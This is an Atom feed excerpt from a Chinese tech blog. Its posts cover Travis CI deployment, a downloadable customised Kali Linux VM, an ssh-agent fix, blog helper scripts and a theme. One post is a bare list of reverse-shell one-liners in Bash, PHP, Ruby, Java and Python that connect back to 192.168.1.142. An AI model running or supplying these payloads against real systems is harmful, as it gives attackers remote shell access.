rel="noopener">git中submodule子模块的添加、使用和删除</a></li><li><a href="https://blog.chh.tw/posts/git-submodule/" target="_blank" rel="noopener">Git Submodule 用法筆記</a></li><li><a href="https://coding.net/help/doc/account/access-token.html" target="_blank" rel="noopener">CODING帮助文档-个人访问令牌</a><blockquote><p>提一句上面的git push –force –quiet “<a href="https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;" target="_blank" rel="noopener">https://Akkuman:${CODING_TOKEN}@${CD_REF}&quot;</a> 网址格式是查询的CODING帮助文档</p></blockquote></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 &lt;code&gt;git push&lt;/code&gt; 就能生成博客？那我推荐你应该使用使用 &lt;code&gt;Travis CI&lt;/code&gt;了。&lt;/p&gt;
&lt;p&gt;这篇文章我们来讲讲如何利用 &lt;code&gt;Travis CI&lt;/code&gt;把你 &lt;code&gt;push&lt;/code&gt; 上去的博客源文件直接生成可访问的站点，并且同步部署到 &lt;code&gt;github pages&lt;/code&gt; 和 &lt;code&gt;coding pages&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;这篇文章假设你已经对这些采用 &lt;code&gt;git&lt;/code&gt; 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 &lt;code&gt;git&lt;/code&gt; 以及了解 &lt;code&gt;hexo&lt;/code&gt; 写博客发布到这些 &lt;code&gt;pages&lt;/code&gt; 服务的流程。因此本文会写的较为&lt;strong&gt;简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案&lt;/strong&gt;，希望能够帮助到大家。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>Kali Linux Xfce版美化虚拟机镜像</title>
    <link href="http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html"/>
    <id>http://hacktech.cn/2018/09/04/kali-xfce-vm-amd64-beautify.html</id>
    <published>2018-09-04T02:59:43.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。</p><p><code>Kali</code> 一直用的是 <code>xfce</code> 版本，至于为什么用这个版本，是因为我感觉 <code>gnome3</code> 在虚拟机上表现欠佳。当然，默认的 <code>gnome3</code> 看起来还是不错的，而 <code>xfce</code> 默认的就看起来很寒碜了</p><p>默认的 <code>Kali-Xfce</code> 是这个样子的</p><a id="more"></a><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxco29z1zj20le0c0146.jpg" alt="原版kali-xfce"></p><p>具体过程不表了，如果有人有需要我再发吧，毕竟这次美化过程没有记录，我也懒得再重操一遍了，直接上美化后的截图吧</p><h2 id="美化截图"><a href="#美化截图" class="headerlink" title="美化截图"></a>美化截图</h2><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxcov30z4j21hc0u07bd.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxd0a4t5ej21hc0u0u0x.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/c0264382ly1fuxd11uu4qj21hc0u0b29.jpg" alt=""></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础使用"><a href="#基础使用" class="headerlink" title="基础使用"></a>基础使用</h3><p><strong>注意是64位的镜像，需要cpu虚拟化开启支持</strong></p><p>直接解压然后导入vmware（version &gt;= 10.X）虚拟机即可，默认账户密码为 <code>root:toor</code></p><p>软件源已改为国内的中科大源，不需要自己换</p><h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><p>已更新到 <code>2018-09-04</code> 最新，如果需要更新可以运行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt upadte</span><br><span class="line">apt full-upgrade</span><br></pre></td></tr></table></figure><h3 id="顶栏透明"><a href="#顶栏透明" class="headerlink" title="顶栏透明"></a>顶栏透明</h3><p>图片上的顶栏可以改为透明的，在顶栏上右键然后找到 <code>面板首选项 -&gt; 外观 -&gt; alpha</code> 改为 <code>0</code> ，顶栏可透明</p><h3 id="更新vmtool"><a href="#更新vmtool" class="headerlink" title="更新vmtool"></a>更新vmtool</h3><p>打开终端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install open-vm-tools-desktop</span><br></pre></td></tr></table></figure><p>如果有新版本vmtool会提示更新</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><h3 id="校验"><a href="#校验" class="headerlink" title="校验"></a>校验</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">大小: 3649679846 字节</span><br><span class="line">修改时间: 2018年9月4日, 11:18:46</span><br><span class="line">MD5: EDC1BF26205D06EA668F8EA03A05D456</span><br><span class="line">SHA1: 4C2F32BA2DDC53425F34B4316F55C66755A08ACA</span><br><span class="line">CRC32: A51255F0</span><br></pre></td></tr></table></figure><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><ul><li><a href="https://pan.baidu.com/s/1Neyff9GpVm08w5A6lesmQQ" target="_blank" rel="noopener">百度网盘 | 密码: jcus</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;这两天来学校把硬盘基本全部清空了，所以以前的虚拟机就需要重新安装了。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Kali&lt;/code&gt; 一直用的是 &lt;code&gt;xfce&lt;/code&gt; 版本，至于为什么用这个版本，是因为我感觉 &lt;code&gt;gnome3&lt;/code&gt; 在虚拟机上表现欠佳。当然，默认的 &lt;code&gt;gnome3&lt;/code&gt; 看起来还是不错的，而 &lt;code&gt;xfce&lt;/code&gt; 默认的就看起来很寒碜了&lt;/p&gt;
&lt;p&gt;默认的 &lt;code&gt;Kali-Xfce&lt;/code&gt; 是这个样子的&lt;/p&gt;
    
    </summary>
    
      <category term="Kali" scheme="http://hacktech.cn/categories/Kali/"/>
    
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="Kali" scheme="http://hacktech.cn/tags/Kali/"/>
    
  </entry>
  
  <entry>
    <title>win10 1803版本unable to start ssh-agent service, error :1058</title>
    <link href="http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html"/>
    <id>http://hacktech.cn/2018/09/01/win10-1803-unable-to-start-ssh-agent.html</id>
    <published>2018-09-01T08:26:11.000Z</published>
    <updated>2018-09-08T06:50:11.311Z</updated>
    
    <content type="html"><![CDATA[<p>PowerShell安装了pshazz或者posh-git，但是打开的时候提示 <code>unable to start ssh-agent service, error :1058</code>  </p><a id="more"></a><p>1803的设置上面可以看到这个版本是默认带了openssh客户端的，我们不需要另外去安装，但是命令行运行 <code>ssh-agent</code> 依然是显示 <code>unable to start ssh-agent service, error :1058</code>  </p><p>既然有这个东西，但是服务启动失败，那我们看看本地服务，果然，在本地服务中禁用了，我们改成手动或者自动就能解决这个问题了</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;PowerShell安装了pshazz或者posh-git，但是打开的时候提示 &lt;code&gt;unable to start ssh-agent service, error :1058&lt;/code&gt;  &lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
      <category term="Win10" scheme="http://hacktech.cn/tags/Win10/"/>
    
  </entry>
  
  <entry>
    <title>反弹shell以及端口转发的方法收集</title>
    <link href="http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html"/>
    <id>http://hacktech.cn/2018/08/23/the-code-reverse-shell-and-port-forward.html</id>
    <published>2018-08-23T08:03:29.000Z</published>
    <updated>2018-09-08T06:50:11.311Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.142/80 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/192.168.1.142/80</span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span> </span><br><span class="line"><span class="comment"># or:</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">read</span> line 0&lt;&amp;5; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -r ‘$sock=fsockopen(“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>);exec(“/bin/sh -i &lt;&amp;<span class="number">3</span> &gt;&amp;<span class="number">3</span> <span class="number">2</span>&gt;&amp;<span class="number">3</span>”);’</span><br><span class="line">(Assumes TCP uses file descriptor <span class="number">3.</span> <span class="keyword">If</span> it doesn’t work, <span class="keyword">try</span> <span class="number">4</span>,<span class="number">5</span>, <span class="keyword">or</span> <span class="number">6</span>)</span><br></pre></td></tr></table></figure><h2 id="RUBY"><a href="#RUBY" class="headerlink" title="RUBY"></a>RUBY</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e’f=TCPSocket.open(“<span class="number">192.168</span>.<span class="number">1.142</span>”,<span class="number">80</span>).to_i;exec sprintf(“/bin/sh -i &lt;&amp;%d &gt;&amp;%d <span class="number">2</span>&gt;&amp;%d”,f,f,f)’</span><br></pre></td></tr></table></figure><h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([“/bin/bash”,”-c”,”exec <span class="number">5</span>&lt;&gt;/dev/tcp/<span class="number">192.168</span>.1.142/<span class="number">80</span>;cat &lt;&amp;<span class="number">5</span> | <span class="keyword">while</span> read line; <span class="keyword">do</span> \$line <span class="number">2</span>&gt;&amp;<span class="number">5</span> &gt;&amp;<span class="number">5</span>; done”] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON"></a>PYTHON</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c ‘<span class="keyword">import</span> socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“<span class="number">192.168</span><span class="number">.1</span><span class="number">.142</span>”,<span class="number">80</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([“/bin/sh”,”-i”]);’</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.1.142/80 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;exec&lt;/span&gt; 5&amp;lt;&amp;gt;/dev/tcp/192.168.1.142/80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cat &amp;lt;&amp;amp;5 | &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# or:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;read&lt;/span&gt; line 0&amp;lt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$line&lt;/span&gt; 2&amp;gt;&amp;amp;5 &amp;gt;&amp;amp;5; &lt;span class=&quot;keyword&quot;&gt;done&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Hacker" scheme="http://hacktech.cn/categories/Hacker/"/>
    
    
      <category term="Hacker" scheme="http://hacktech.cn/tags/Hacker/"/>
    
  </entry>
  
  <entry>
    <title>为纸小墨一键创建md文件</title>
    <link href="http://hacktech.cn/2018/08/22/ink-create-md.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-create-md.html</id>
    <published>2018-08-22T10:17:23.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python the.py file_name [article_title] [author_id]</span><br><span class="line"><span class="comment"># []括起来为可选项</span></span><br></pre></td></tr></table></figure><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    file_name = <span class="string">''</span></span><br><span class="line">    post_title = <span class="string">''</span></span><br><span class="line">    author = <span class="string">'me'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">4</span>:</span><br><span class="line">        file_name = str(sys.argv[<span class="number">1</span>])</span><br><span class="line">        post_title = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        author = str(sys.argv[<span class="number">3</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"Usage: \n\t%s file_name [article_title] [author_id]"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./blog/source/%s.md'</span> % file_name, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">'title: %s\n'</span> % post_title)</span><br><span class="line">        f.write(<span class="string">'date: %s\n'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()))</span><br><span class="line">        f.write(<span class="string">'update: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'author: %s\n'</span> % author)</span><br><span class="line">        f.write(<span class="string">'tags: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'categories: \n'</span>)</span><br><span class="line">        f.write(<span class="string">'- \n'</span>)</span><br><span class="line">        f.write(<span class="string">'topic: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'cover: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'draft: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'preview: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'top: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'type: ""\n'</span>)</span><br><span class="line">        f.write(<span class="string">'hide: false\n'</span>)</span><br><span class="line">        f.write(<span class="string">'config: null\n'</span>)</span><br><span class="line">        f.write(<span class="string">'\n\n---\n\n\n\n'</span>)</span><br><span class="line">    print(<span class="string">'Create %s.md Finished'</span> % file_name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用法：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;python the.py file_name [article_title] [author_id]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# []括起来为可选项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>一键git push脚本(python版)</title>
    <link href="http://hacktech.cn/2018/08/22/git-push-python-script.html"/>
    <id>http://hacktech.cn/2018/08/22/git-push-python-script.html</id>
    <published>2018-08-22T09:34:24.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">gitconfig = &#123;</span><br><span class="line">    <span class="string">'cwd'</span>: <span class="string">'./blog/public'</span>,</span><br><span class="line">    <span class="string">'git'</span>: &#123;</span><br><span class="line">        <span class="string">'github'</span>: [<span class="string">'git@github.com:akkuman/akkuman.github.io.git'</span>, <span class="string">'master'</span>],</span><br><span class="line">        <span class="string">'coding'</span>: [<span class="string">'git@git.coding.net:Akkuman/Akkuman.git'</span>, <span class="string">'coding-pages'</span>],</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> gitconfig</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change working directory</span></span><br><span class="line">    os.chdir(gitconfig.get(<span class="string">'cwd'</span>, <span class="string">'.'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if git init</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'.git'</span> <span class="keyword">not</span> <span class="keyword">in</span> os.listdir():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'init'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check if remote in config, if not, add the remote</span></span><br><span class="line">    git_remotes = subprocess.check_output([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'-v'</span>])</span><br><span class="line">    git_remotes_str = bytes.decode(git_remotes).strip()</span><br><span class="line">    git_remotes_list = [line.split()[<span class="number">0</span>] <span class="keyword">for</span> line <span class="keyword">in</span> git_remotes_str.split(<span class="string">'\n'</span>)]</span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        <span class="keyword">if</span> k <span class="keyword">not</span> <span class="keyword">in</span> git_remotes_list:</span><br><span class="line">            subprocess.check_call([<span class="string">'git'</span>, <span class="string">'remote'</span>, <span class="string">'add'</span>, k, v[<span class="number">0</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># add . &amp; commit with message</span></span><br><span class="line">    subprocess.check_call([<span class="string">'git'</span>, <span class="string">'add'</span>, <span class="string">'.'</span>])</span><br><span class="line">    commit_message = <span class="string">'Site updated: %s'</span> % time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime())</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        commit_message = sys.argv[<span class="number">1</span>]</span><br><span class="line">    subprocess.call([<span class="string">'git'</span>, <span class="string">'commit'</span>, <span class="string">'-m'</span>, commit_message])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># push to every remote repo</span></span><br><span class="line">    <span class="keyword">for</span> k,v <span class="keyword">in</span> gitconfig[<span class="string">'git'</span>].items():</span><br><span class="line">        subprocess.check_call([<span class="string">'git'</span>, <span class="string">'push'</span>, k, <span class="string">'master:%s'</span> % v[<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">'-h'</span>:</span><br><span class="line">            print(<span class="string">'Usage:\n\t%s [commit_message]'</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有时候感觉项目push上去每次都敲那么几个命令挺烦人的，可以用这个脚本来代替手工&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>纸小墨ink简洁主题story爱上你的故事</title>
    <link href="http://hacktech.cn/2018/08/22/ink-theme-story.html"/>
    <id>http://hacktech.cn/2018/08/22/ink-theme-story.html</id>
    <published>2018-08-22T07:36:42.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主题介绍"><a href="#主题介绍" class="headerlink" title="主题介绍"></a>主题介绍</h2><p>为纸小墨写的一款主题,该主题移植自<a href="https://yumoe.com" target="_blank" rel="noopener">Yumoe</a><br><!--和[Artifact.](https://artifact.me/)--></p><p>github地址：<a href="https://github.com/akkuman/ink-theme-story" target="_blank" rel="noopener">ink-theme-story</a></p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p><a href="https://ink-theme-story.pancakeapps.com" target="_blank" rel="noopener">ink-theme-story</a></p><a id="more"></a><h3 id="主题的一些食用说明"><a href="#主题的一些食用说明" class="headerlink" title="主题的一些食用说明"></a>主题的一些食用说明</h3><h4 id="菜单"><a href="#菜单" class="headerlink" title="菜单"></a>菜单</h4><p>标题旁边有一个 · 字符，点击后便可显示菜单。<strong>1</strong>,<strong>2</strong>,<strong>3</strong> 分别代表 <strong>独立页面菜单</strong>、<strong>导航树</strong>(仅在文章界面有用)以及<strong>搜索框</strong>。</p><h3 id="一些功能"><a href="#一些功能" class="headerlink" title="一些功能"></a>一些功能</h3><ul><li>评论点击加载, 可以应对一些墙导致无法加载的场景</li><li>图片懒加载</li><li>评论系统支持来必力, Disqus, Gitment, 默认为Disqus</li><li>…</li></ul><h2 id="主题截图"><a href="#主题截图" class="headerlink" title="主题截图"></a>主题截图</h2><p><img src="https://i.loli.net/2018/08/20/5b7a62b4ce584.png" alt="Screenshot_20180820_143859.png"></p><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="基础设置"><a href="#基础设置" class="headerlink" title="基础设置"></a>基础设置</h3><p>进入到纸小墨程序的目录下, 也就是ink主程序的目录, 然后进入该目录下的blog目录</p><p>然后执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/akkuman/ink-theme-story.git</span><br></pre></td></tr></table></figure></p><p>或者下载git压缩包后解压到blog文件夹</p><p>现在你可以看到blog目录下的ink-theme-story目录</p><p>然后修改站点配置文件<code>blog/config.yml</code></p><p>站点配置文件一般如下: </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 